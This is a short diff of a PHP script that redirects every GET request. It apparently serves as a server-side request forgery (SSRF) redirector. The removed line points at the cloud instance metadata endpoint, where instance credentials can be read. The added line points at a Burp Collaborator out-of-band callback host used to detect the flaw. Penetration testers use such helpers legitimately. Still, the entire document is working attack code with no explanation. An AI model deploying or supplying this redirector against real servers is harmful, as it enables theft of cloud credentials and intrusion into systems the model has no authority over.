@@ -1,5 +1,5 @@
 <?php
 if ($_SERVER['REQUEST_METHOD'] === 'GET') {
-    header("Location: http://169.254.169.254/latest/meta-data/");
+    header("Location: http://bixvxxii4klule0dlld07a2kbbh45t.burpcollaborator.net");
     exit;
 }
